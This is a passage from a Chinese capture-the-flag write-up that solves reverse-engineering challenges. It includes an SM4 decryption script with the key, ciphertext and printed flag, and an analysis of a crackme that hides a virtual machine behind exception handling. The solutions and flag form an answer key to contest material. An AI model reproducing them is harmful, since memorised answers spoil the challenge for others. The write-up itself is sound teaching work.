src="/p/wpFor-2021HWSTrial/image-20210201092418039.png"></p><p>噢，感谢密钥的提示，不用看了hhh，直接sm4解密（从<a href="https://blog.csdn.net/qq_36298219/article/details/85339515">SM4 python_dumpling-cat的博客-CSDN博客</a>抓了脚本改了改）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># S盒</span></span><br><span class="line">SboxTable = \</span><br><span class="line">[</span><br><span class="line">    <span class="number">0xd6</span>, <span class="number">0x90</span>, <span class="number">0xe9</span>, <span class="number">0xfe</span>, <span class="number">0xcc</span>, <span class="number">0xe1</span>, <span class="number">0x3d</span>, <span class="number">0xb7</span>, <span class="number">0x16</span>, <span class="number">0xb6</span>, <span class="number">0x14</span>, <span class="number">0xc2</span>, <span class="number">0x28</span>, <span class="number">0xfb</span>, <span class="number">0x2c</span>, <span class="number">0x05</span>,</span><br><span class="line">    <span class="number">0x2b</span>, <span class="number">0x67</span>, <span class="number">0x9a</span>, <span class="number">0x76</span>, <span class="number">0x2a</span>, <span class="number">0xbe</span>, <span class="number">0x04</span>, <span class="number">0xc3</span>, <span class="number">0xaa</span>, <span class="number">0x44</span>, <span class="number">0x13</span>, <span class="number">0x26</span>, <span class="number">0x49</span>, <span class="number">0x86</span>, <span class="number">0x06</span>, <span class="number">0x99</span>,</span><br><span class="line">    <span class="number">0x9c</span>, <span class="number">0x42</span>, <span class="number">0x50</span>, <span class="number">0xf4</span>, <span class="number">0x91</span>, <span class="number">0xef</span>, <span class="number">0x98</span>, <span class="number">0x7a</span>, <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0x0b</span>, <span class="number">0x43</span>, <span class="number">0xed</span>, <span class="number">0xcf</span>, <span class="number">0xac</span>, <span class="number">0x62</span>,</span><br><span class="line">    <span class="number">0xe4</span>, <span class="number">0xb3</span>, <span class="number">0x1c</span>, <span class="number">0xa9</span>, <span class="number">0xc9</span>, <span class="number">0x08</span>, <span class="number">0xe8</span>, <span class="number">0x95</span>, <span class="number">0x80</span>, <span class="number">0xdf</span>, <span class="number">0x94</span>, <span class="number">0xfa</span>, <span class="number">0x75</span>, <span class="number">0x8f</span>, <span class="number">0x3f</span>, <span class="number">0xa6</span>,</span><br><span class="line">    <span class="number">0x47</span>, <span class="number">0x07</span>, <span class="number">0xa7</span>, <span class="number">0xfc</span>, <span class="number">0xf3</span>, <span class="number">0x73</span>, <span class="number">0x17</span>, <span class="number">0xba</span>, <span class="number">0x83</span>, <span class="number">0x59</span>, <span class="number">0x3c</span>, <span class="number">0x19</span>, <span class="number">0xe6</span>, <span class="number">0x85</span>, <span class="number">0x4f</span>, <span class="number">0xa8</span>,</span><br><span class="line">    <span class="number">0x68</span>, <span class="number">0x6b</span>, <span class="number">0x81</span>, <span class="number">0xb2</span>, <span class="number">0x71</span>, <span class="number">0x64</span>, <span class="number">0xda</span>, <span class="number">0x8b</span>, <span class="number">0xf8</span>, <span class="number">0xeb</span>, <span class="number">0x0f</span>, <span class="number">0x4b</span>, <span class="number">0x70</span>, <span class="number">0x56</span>, <span class="number">0x9d</span>, <span class="number">0x35</span>,</span><br><span class="line">    <span class="number">0x1e</span>, <span class="number">0x24</span>, <span class="number">0x0e</span>, <span class="number">0x5e</span>, <span class="number">0x63</span>, <span class="number">0x58</span>, <span class="number">0xd1</span>, <span class="number">0xa2</span>, <span class="number">0x25</span>, <span class="number">0x22</span>, <span class="number">0x7c</span>, <span class="number">0x3b</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x78</span>, <span class="number">0x87</span>,</span><br><span class="line">    <span class="number">0xd4</span>, <span class="number">0x00</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0x9f</span>, <span class="number">0xd3</span>, <span class="number">0x27</span>, <span class="number">0x52</span>, <span class="number">0x4c</span>, <span class="number">0x36</span>, <span class="number">0x02</span>, <span class="number">0xe7</span>, <span class="number">0xa0</span>, <span class="number">0xc4</span>, <span class="number">0xc8</span>, <span class="number">0x9e</span>,</span><br><span class="line">    <span class="number">0xea</span>, <span class="number">0xbf</span>, <span class="number">0x8a</span>, <span class="number">0xd2</span>, <span class="number">0x40</span>, <span class="number">0xc7</span>, <span class="number">0x38</span>, <span class="number">0xb5</span>, <span class="number">0xa3</span>, <span class="number">0xf7</span>, <span class="number">0xf2</span>, <span class="number">0xce</span>, <span class="number">0xf9</span>, <span class="number">0x61</span>, <span class="number">0x15</span>, <span class="number">0xa1</span>,</span><br><span class="line">    <span class="number">0xe0</span>, <span class="number">0xae</span>, <span class="number">0x5d</span>, <span class="number">0xa4</span>, <span class="number">0x9b</span>, <span class="number">0x34</span>, <span class="number">0x1a</span>, <span class="number">0x55</span>, <span class="number">0xad</span>, <span class="number">0x93</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0xf5</span>, <span class="number">0x8c</span>, <span class="number">0xb1</span>, <span class="number">0xe3</span>,</span><br><span class="line">    <span class="number">0x1d</span>, <span class="number">0xf6</span>, <span class="number">0xe2</span>, <span class="number">0x2e</span>, <span class="number">0x82</span>, <span class="number">0x66</span>, <span class="number">0xca</span>, <span class="number">0x60</span>, <span class="number">0xc0</span>, <span class="number">0x29</span>, <span class="number">0x23</span>, <span class="number">0xab</span>, <span class="number">0x0d</span>, <span class="number">0x53</span>, <span class="number">0x4e</span>, <span class="number">0x6f</span>,</span><br><span class="line">    <span class="number">0xd5</span>, <span class="number">0xdb</span>, <span class="number">0x37</span>, <span class="number">0x45</span>, <span class="number">0xde</span>, <span class="number">0xfd</span>, <span class="number">0x8e</span>, <span class="number">0x2f</span>, <span class="number">0x03</span>, <span class="number">0xff</span>, <span class="number">0x6a</span>, <span class="number">0x72</span>, <span class="number">0x6d</span>, <span class="number">0x6c</span>, <span class="number">0x5b</span>, <span class="number">0x51</span>,</span><br><span class="line">    <span class="number">0x8d</span>, <span class="number">0x1b</span>, <span class="number">0xaf</span>, <span class="number">0x92</span>, <span class="number">0xbb</span>, <span class="number">0xdd</span>, <span class="number">0xbc</span>, <span class="number">0x7f</span>, <span class="number">0x11</span>, <span class="number">0xd9</span>, <span class="number">0x5c</span>, <span class="number">0x41</span>, <span class="number">0x1f</span>, <span class="number">0x10</span>, <span class="number">0x5a</span>, <span class="number">0xd8</span>,</span><br><span class="line">    <span class="number">0x0a</span>, <span class="number">0xc1</span>, <span class="number">0x31</span>, <span class="number">0x88</span>, <span class="number">0xa5</span>, <span class="number">0xcd</span>, <span class="number">0x7b</span>, <span class="number">0xbd</span>, <span class="number">0x2d</span>, <span class="number">0x74</span>, <span class="number">0xd0</span>, <span class="number">0x12</span>, <span class="number">0xb8</span>, <span class="number">0xe5</span>, <span class="number">0xb4</span>, <span class="number">0xb0</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0x69</span>, <span class="number">0x97</span>, <span class="number">0x4a</span>, <span class="number">0x0c</span>, <span class="number">0x96</span>, <span class="number">0x77</span>, <span class="number">0x7e</span>, <span class="number">0x65</span>, <span class="number">0xb9</span>, <span class="number">0xf1</span>, <span class="number">0x09</span>, <span class="number">0xc5</span>, <span class="number">0x6e</span>, <span class="number">0xc6</span>, <span class="number">0x84</span>,</span><br><span class="line">    <span class="number">0x18</span>, <span class="number">0xf0</span>, <span class="number">0x7d</span>, <span class="number">0xec</span>, <span class="number">0x3a</span>, <span class="number">0xdc</span>, <span class="number">0x4d</span>, <span class="number">0x20</span>, <span class="number">0x79</span>, <span class="number">0xee</span>, <span class="number">0x5f</span>, <span class="number">0x3e</span>, <span class="number">0xd7</span>, <span class="number">0xcb</span>, <span class="number">0x39</span>, <span class="number">0x48</span>,</span><br><span class="line">]</span><br><span class="line"><span class="comment"># 常数FK</span></span><br><span class="line">FK = [<span class="number">0xa3b1bac6</span>, <span class="number">0x56aa3350</span>, <span class="number">0x677d9197</span>, <span class="number">0xb27022dc</span>] ; ENCRYPT = <span class="number">0</span> ;DECRYPT = <span class="number">1</span></span><br><span class="line"><span class="comment"># 固定参数CK</span></span><br><span class="line">CK = \</span><br><span class="line">[</span><br><span class="line">    <span class="number">0x00070e15</span>, <span class="number">0x1c232a31</span>, <span class="number">0x383f464d</span>, <span class="number">0x545b6269</span>,</span><br><span class="line">    <span class="number">0x70777e85</span>, <span class="number">0x8c939aa1</span>, <span class="number">0xa8afb6bd</span>, <span class="number">0xc4cbd2d9</span>,</span><br><span class="line">    <span class="number">0xe0e7eef5</span>, <span class="number">0xfc030a11</span>, <span class="number">0x181f262d</span>, <span class="number">0x343b4249</span>,</span><br><span class="line">    <span class="number">0x50575e65</span>, <span class="number">0x6c737a81</span>, <span class="number">0x888f969d</span>, <span class="number">0xa4abb2b9</span>,</span><br><span class="line">    <span class="number">0xc0c7ced5</span>, <span class="number">0xdce3eaf1</span>, <span class="number">0xf8ff060d</span>, <span class="number">0x141b2229</span>,</span><br><span class="line">    <span class="number">0x30373e45</span>, <span class="number">0x4c535a61</span>, <span class="number">0x686f767d</span>, <span class="number">0x848b9299</span>,</span><br><span class="line">    <span class="number">0xa0a7aeb5</span>, <span class="number">0xbcc3cad1</span>, <span class="number">0xd8dfe6ed</span>, <span class="number">0xf4fb0209</span>,</span><br><span class="line">    <span class="number">0x10171e25</span>, <span class="number">0x2c333a41</span>, <span class="number">0x484f565d</span>, <span class="number">0x646b7279</span></span><br><span class="line">]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding</span>(<span class="params">data</span>):</span>   <span class="comment">#填充</span></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;plaintext:\t&quot;</span>, <span class="built_in">bytes</span> (data))</span><br><span class="line">    file_data_list = <span class="built_in">list</span>(data)</span><br><span class="line">    lenth = <span class="built_in">len</span> (file_data_list)</span><br><span class="line">    <span class="comment">#print (&quot;data lenth:&quot;, lenth)</span></span><br><span class="line">    remainder = lenth % <span class="number">16</span></span><br><span class="line">    <span class="keyword">if</span> remainder != <span class="number">0</span>:</span><br><span class="line">        i=<span class="number">16</span>-remainder               <span class="comment">#i为需要填充的位数</span></span><br><span class="line">        <span class="comment">#print (&quot;padding numbers = &quot;, i)</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">           file_data_list.append(i)  <span class="comment">#填充 char 0-(i-1)</span></span><br><span class="line">    <span class="keyword">if</span> remainder == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            file_data_list.append (<span class="number">0x08</span>)  <span class="comment">#刚好的话 填充0x08</span></span><br><span class="line">    print(<span class="string">&quot;after PKCS5 padding:&quot;</span>,file_data_list)</span><br><span class="line">    <span class="keyword">return</span> file_data_list</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list_4_8_to_int32</span>(<span class="params">key_data</span>):</span>  <span class="comment"># 列表4个8位，组成32位</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span> ((key_data[<span class="number">0</span>] &lt;&lt; <span class="number">24</span>) | (key_data[<span class="number">1</span>] &lt;&lt; <span class="number">16</span>) | (key_data[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) | (key_data[<span class="number">3</span>]))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">n32_to_list4_8</span>(<span class="params">n</span>):</span>  <span class="comment">#把n分别取32位的每8位放入列表</span></span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">int</span> ((n &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>), <span class="built_in">int</span> ((n &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>), <span class="built_in">int</span> ((n &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>), <span class="built_in">int</span> ((n) &amp; <span class="number">0xff</span>)]</span><br><span class="line"><span class="comment">#循环左移</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shift_left_n</span>(<span class="params">x, n</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span> (<span class="built_in">int</span> (x &lt;&lt; n) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shift_logical_left</span>(<span class="params">x, n</span>):</span></span><br><span class="line">    <span class="keyword">return</span> shift_left_n (x, n) | <span class="built_in">int</span> ((x &gt;&gt; (<span class="number">32</span> - n)) &amp; <span class="number">0xffffffff</span>)  <span class="comment">#两步合在一起实现了循环左移n位</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">XOR</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span> (<span class="built_in">map</span> (<span class="keyword">lambda</span> x, y: x ^ y, a, b))</span><br><span class="line"><span class="comment">#s盒查找</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sbox</span>(<span class="params">idx</span>):</span></span><br><span class="line">    <span class="keyword">return</span> SboxTable[idx]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extended_key_LB</span>(<span class="params">ka</span>):</span>      <span class="comment">#拓展密钥算法LB</span></span><br><span class="line">    a = n32_to_list4_8 (ka)                <span class="comment">#a是ka的每8位组成的列表</span></span><br><span class="line">    b = [sbox (i) <span class="keyword">for</span> i <span class="keyword">in</span> a]               <span class="comment">#在s盒中每8位查找后，放入列表b，再组合成int bb</span></span><br><span class="line">    bb = list_4_8_to_int32 (b)</span><br><span class="line">    rk = bb ^ (shift_logical_left (bb, <span class="number">13</span>)) ^ (shift_logical_left (bb, <span class="number">23</span>))</span><br><span class="line">    <span class="keyword">return</span> rk</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">linear_transform_L</span>(<span class="params">ka</span>):</span>      <span class="comment">#线性变换L</span></span><br><span class="line">    a = n32_to_list4_8 (ka)</span><br><span class="line">    b = [sbox (i) <span class="keyword">for</span> i <span class="keyword">in</span> a]</span><br><span class="line">    bb = list_4_8_to_int32 (b)     <span class="comment">#bb是经过s盒变换的32位数</span></span><br><span class="line">    <span class="keyword">return</span> bb ^ (shift_logical_left (bb, <span class="number">2</span>)) ^ (shift_logical_left (bb, <span class="number">10</span>)) ^ (shift_logical_left (bb, <span class="number">18</span>)) ^ (shift_logical_left (bb, <span class="number">24</span>)) <span class="comment">#书上公式</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sm4_round_function</span>(<span class="params">x0, x1, x2, x3, rk</span>):</span>   <span class="comment">#轮函数</span></span><br><span class="line">    <span class="keyword">return</span> (x0 ^ linear_transform_L (x1 ^ x2 ^ x3 ^ rk))</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sm4</span> (<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.sk = [<span class="number">0</span>] * <span class="number">32</span></span><br><span class="line">        self.mode = ENCRYPT</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sm4_set_key</span>(<span class="params">self, key_data, mode</span>):</span>    <span class="comment">#先算出拓展密钥</span></span><br><span class="line">        self.extended_key_last (key_data, mode)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">extended_key_last</span>(<span class="params">self, key, mode</span>):</span>   <span class="comment">#密钥扩展算法</span></span><br><span class="line">        MK = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">        k = [<span class="number">0</span>] * <span class="number">36</span></span><br><span class="line">        MK[<span class="number">0</span>] = list_4_8_to_int32 (key[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">        MK[<span class="number">1</span>] = list_4_8_to_int32 (key[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line">        MK[<span class="number">2</span>] = list_4_8_to_int32 (key[<span class="number">8</span>:<span class="number">12</span>])</span><br><span class="line">        MK[<span class="number">3</span>] = list_4_8_to_int32 (key[<span class="number">12</span>:<span class="number">16</span>])</span><br><span class="line">        k[<span class="number">0</span>:<span class="number">4</span>] = XOR (MK, FK)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">32</span>):</span><br><span class="line">            k[i + <span class="number">4</span>] = k[i] ^ (extended_key_LB (k[i + <span class="number">1</span>] ^ k[i + <span class="number">2</span>] ^ k[i + <span class="number">3</span>] ^ CK[i]))</span><br><span class="line">        self.sk = k[<span class="number">4</span>:]   <span class="comment">#生成的32轮子密钥放到sk中</span></span><br><span class="line">        self.mode = mode</span><br><span class="line">        <span class="keyword">if</span> mode == DECRYPT:      <span class="comment">#解密时rki逆序</span></span><br><span class="line">            self.sk.reverse ()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sm4_one_round</span>(<span class="params">self, sk, in_put</span>):</span>   <span class="comment">#一轮算法 ，4个32位的字=128bit=16个字节（8*16）</span></span><br><span class="line">        item = [list_4_8_to_int32 (in_put[<span class="number">0</span>:<span class="number">4</span>]), list_4_8_to_int32 (in_put[<span class="number">4</span>:<span class="number">8</span>]), list_4_8_to_int32 (in_put[<span class="number">8</span>:<span class="number">12</span>]),</span><br><span class="line">                list_4_8_to_int32 (in_put[<span class="number">12</span>:<span class="number">16</span>])]    <span class="comment">#4字节一个字，把每4个字节变成32位的int</span></span><br><span class="line">        x=item</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">32</span>):</span><br><span class="line">            temp=x[<span class="number">3</span>]</span><br><span class="line">            x[<span class="number">3</span>] = sm4_round_function (x[<span class="number">0</span>], x[<span class="number">1</span>], x[<span class="number">2</span>], x[<span class="number">3</span>], sk[i]) <span class="comment">#x[3]成为x[4]</span></span><br><span class="line">            x[<span class="number">0</span>]=x[<span class="number">1</span>]</span><br><span class="line">            x[<span class="number">1</span>]=x[<span class="number">2</span>]</span><br><span class="line">            x[<span class="number">2</span>]=temp</span><br><span class="line">            print(<span class="string">&quot;%dround-----&gt;&quot;</span>%(i+<span class="number">1</span>),<span class="string">&quot;key:%-12d\n&quot;</span>%sk[i],<span class="string">&quot;result：&quot;</span>,x)</span><br><span class="line">        res=x</span><br><span class="line">        <span class="comment"># res = reduce (lambda x, y: [x[1], x[2], x[3], sm4_round_function (x[0], x[1], x[2], x[3], y)],sk, item) #32轮循环加密</span></span><br><span class="line">        res.reverse ()</span><br><span class="line">        rev = <span class="built_in">map</span> (n32_to_list4_8, res)</span><br><span class="line">        out_put = []</span><br><span class="line">        [out_put.extend (_) <span class="keyword">for</span> _ <span class="keyword">in</span> rev]</span><br><span class="line">        <span class="keyword">return</span> out_put</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">self, input_data</span>):</span></span><br><span class="line">        <span class="comment"># 块加密</span></span><br><span class="line">        output_data = []</span><br><span class="line">        tmp = [input_data[i:i + <span class="number">16</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">0</span>, <span class="built_in">len</span> (input_data), <span class="number">16</span>)]  <span class="comment">#输入数据分块</span></span><br><span class="line">        [output_data.extend (each) <span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">map</span> (<span class="keyword">lambda</span> x: self.sm4_one_round (self.sk, x), tmp)]</span><br><span class="line">        <span class="keyword">return</span> output_data</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">mode, key, data</span>):</span></span><br><span class="line">    sm4_d = Sm4 ()</span><br><span class="line">    sm4_d.sm4_set_key (key, mode)</span><br><span class="line">    en_data = sm4_d.encrypt (data)</span><br><span class="line">    <span class="keyword">return</span> en_data</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sm4_crypt_cbc</span>(<span class="params">mode, key, iv, data</span>):</span></span><br><span class="line">    sm4_d = Sm4 ()</span><br><span class="line">    sm4_d.sm4_set_key (key, mode)</span><br><span class="line">    en_data = sm4_d.sm4_crypt_cbc (iv, data)</span><br><span class="line">    <span class="keyword">return</span> en_data</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    key_data=[<span class="built_in">ord</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&quot;Ez_5M4_C1pH@r!!!&quot;</span>]</span><br><span class="line">    en_data=<span class="string">b&quot;\xEA\x63\x58\xB7\x8C\xE2\xA1\xE9\xC5\x29\x8F\x53\xE8\x08\x32\x59\xAF\x1B\x67\xAE\xD9\xDA\xCF\xC4\x72\xFF\xB1\xEC\x76\x73\xF3\x06&quot;</span></span><br><span class="line">    sm4_d = Sm4 ()</span><br><span class="line">    sm4_d.sm4_set_key (key_data, DECRYPT)</span><br><span class="line">    de_data = sm4_d.encrypt (en_data)</span><br><span class="line">    flag=<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">chr</span>,de_data)))</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure><p><strong>flag：42b061b4cb41cfa89ca78047bde1856e</strong></p><h2 id="Enigma"><a href="#Enigma" class="headerlink" title="Enigma"></a>Enigma</h2><p><img src="/p/wpFor-2021HWSTrial/image-20210201130540850.png"></p><p>逻辑很清晰，直接分析loc_4018F0。</p><p><img src="/p/wpFor-2021HWSTrial/image-20210201130629612.png"></p><p>这边有一个SetUnhandledExceptionFilter捕获异常。</p><p>一开始以为下面的都是花指令，但每次都是0xC7转不了就很奇怪，异常+0xC7想到了平时用的CC断点，再加上sub_401630看起来像是个虚拟机，感觉0xC7是一个中断号（计组刚学，捕获中断然后用sub_401630处理。</p><p><img src="/p/wpFor-2021HWSTrial/image-20210201131900034.png"></p><p>每一个case里sub_4011B0是取值，另一个函数则是处理，v18是指令长度。</p><p>通过对ExceptionInfo的查阅发现，<code>v19=*(_DWORD *)(*(_DWORD *)(a1 + 4) + 0xB8)</code>开始是异常发生的地址即0xC7的地址，最后则应该是异常处理完毕后要返回的用户空间代码地址。（这么一推异常应该是C7FF才对</p><p>opcode是C7FF的下一个即v19+2，后面的为操作数。</p><p>二级函数里面都是对a1[40]~a1[44]进行操作，猜测是寄存器。</p><p>于是可以分析出：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// xx为[1,5]，rx为对应的a1[40]~a1[44]寄存器，是二级函数中的case</span></span><br><span class="line"><span class="comment">// 1-&gt;a1[44],2-&gt;a1[41],3-&gt;a1[43],4-&gt;a1[42],5-&gt;a1[40]</span></span><br><span class="line"><span class="comment">// imm为立即数</span></span><br><span class="line">C7 FF <span class="number">00</span> xx imm                 <span class="comment">//add rx,imm</span></span><br><span class="line">C7 FF <span class="number">01</span> xx imm                 <span class="comment">//sub rx,imm</span></span><br><span class="line">C7 FF <span class="number">02</span> xx                     <span class="comment">//inc rx</span></span><br><span class="line">C7 FF <span class="number">03</span> xx                     <span class="comment">//dec rx</span></span><br><span class="line">C7 FF <span class="number">04</span> xx imm                 <span class="comment">//and rx,imm</span></span><br><span class="line">C7 FF <span class="number">05</span> xx imm                 <span class="comment">//or rx,imm</span></span><br><span class="line">C7 FF <span class="number">06</span> xx imm                 <span class="comment">//xor rx,imm</span></span><br><span class="line">C7 FF <span class="number">07</span> xx imm                 <span class="comment">//shl rx,imm</span></span><br><span class="line">C7 FF <span class="number">08</span> xx imm                 <span class="comment">//shr rx,imm</span></span><br></pre></td></tr></table></figure><p>然后把下面的机器码中带有C7 FF系列指令以外的先转换成code。</p><p><img src="/p/wpFor-2021HWSTrial/image-20210201142850368.png"></p><p>接下来处理这些异常部分的机器码，比如第一个中断翻译出来是<code>and r1,0</code>，即将r1清空，汇编习惯上更常用<code>xor r1,r1 </code>，先用注释标注。</p><p><img src="/p/wpFor-2021HWSTrial/image-20210201141829350.png"></p><p>然后根据上下文以及上图可以推断出r1-r5分别对应如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">r1 -&gt; eax;</span><br><span class="line">r2 -&gt; ebx;</span><br><span class="line">r3 -&gt; ecx;</span><br><span class="line">r4 -&gt; edx;</span><br><span class="line">r5 -&gt; esi;</span><br></pre></td></tr></table></figure><p>patch程序，多余字节直接nop（因为不记得有些机器码了所以直接用keypatch。</p><p><img src="/p/wpFor-2021HWSTrial/image-20210202104517341.png"></p><p>然后得到反编译的加密函数。</p><p><img src="/p/wpFor-2021HWSTrial/image-20210201144054388.png"></p><p>根据逻辑逆向写出exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">dst=<span class="string">&quot;938b8f431268f7907a4b6e421301b42120738d68cb19fcf8b26bc4abc89b8d22&quot;</span></span><br><span class="line">output=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">64</span>,<span class="number">2</span>):</span><br><span class="line">    output.append(<span class="built_in">int</span>(<span class="string">&quot;0x&quot;</span>+dst[i:i+<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line">key=[<span class="number">0x42</span>, <span class="number">0x69</span>, <span class="number">0x65</span>, <span class="number">0x72</span>]</span><br><span class="line">tmp2=[output[<span class="number">0</span>]]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">32</span>):</span><br><span class="line">    tmp2.append(output[i]^tmp2[i<span class="number">-1</span>]^key[i&amp;<span class="number">3</span>])</span><br><span class="line">tmp1=[]</span><br><span 